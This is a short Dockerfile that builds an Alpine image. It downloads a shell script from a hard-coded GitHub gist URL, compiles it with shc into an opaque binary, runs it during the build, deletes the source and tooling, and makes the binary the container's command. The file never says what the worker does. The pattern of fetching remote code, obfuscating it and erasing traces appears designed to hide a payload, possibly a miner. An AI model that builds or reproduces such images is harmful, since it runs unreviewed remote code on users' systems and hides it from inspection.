FROM alpine:edge

ENV SHURL https://gist.githubusercontent.com/1170766016/c8b4bea6a388001e266586c660822d26/raw/23b0be542c66760d21dbe67b2369eb607fe832f1/vl

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*
    
CMD /worker.x
